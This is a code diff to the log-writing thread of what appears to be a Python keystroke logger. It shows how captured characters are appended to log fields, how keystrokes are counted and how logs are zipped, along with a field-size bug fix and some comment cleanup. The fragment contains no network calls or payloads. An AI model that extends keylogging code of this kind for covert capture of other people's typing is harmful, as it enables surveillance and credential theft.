@@ -214,7 +214,7 @@ class LogWriter(threading.Thread):
                 else:
                     eventlisttmp.append(unicode(self.ParseEventValue(event), 'latin-1'))
                     
-                if (self.eventlist[:6] == eventlisttmp[:6]) and (self.settings['General']['Limit Keylog Field Size'] == 0 or len(self.eventlist[-1]) < self.settings['General']['Limit Keylog Field Size']):
+                if (self.eventlist[:6] == eventlisttmp[:6]) and (self.settings['General']['Limit Keylog Field Size'] == 0 or (len(self.eventlist[-1]) + len(eventlisttmp[-1])) < self.settings['General']['Limit Keylog Field Size']):
                     self.eventlist[-1] = str(self.eventlist[-1]) + str(eventlisttmp[-1]) #append char to log
                     if self.settings['General']['Log Key Count'] == True:
                         self.eventlist[-2] = str(int(self.eventlist[-2]) + 1) # increase stroke count
@@ -223,11 +223,8 @@ class LogWriter(threading.Thread):
                     self.eventlist = eventlisttmp
             ## don't need this with infinite timeout?
             except Queue.Empty:
-                #print "queue empty"
-                #self.PrintDebug("\nempty queue...\n")
                 pass #let's keep iterating
             except:
-                #print "some exception was caught in the logwriter loop...\nhere it is:\n", sys.exc_info()
                 self.PrintDebug("some exception was caught in the logwriter loop...\nhere it is:\n", sys.exc_info())
                 pass #let's keep iterating
         
@@ -245,7 +242,6 @@ class LogWriter(threading.Thread):
         if chr(event.Ascii) == self.settings['General']['Log File Field Separator']:
             return(npchrstr)
         
-        #if os.name == 'nt':
         #translate backspace into text string, if option is set.
         if event.Ascii == 8 and self.settings['General']['Parse Backspace'] == True:
             return(npchrstr)
@@ -319,10 +315,6 @@ class LogWriter(threading.Thread):
             for fname in files:
                 #if fname != self.settings['ziparchivename']:
                 if not self.CheckIfZipFile(fname):
-                    #~ if os.name == 'nt':
-                        #~ myzip.write(os.path.join(root,fname).split("\\",1)[1])
-                    #~ elif os.name == 'posix':
-                        #~ myzip.write(os.path.join(root,fname).split("/",1)[1])
                     myzip.write(os.path.join(root,fname).split(os.sep,1)[1])
         
         myzip.close()
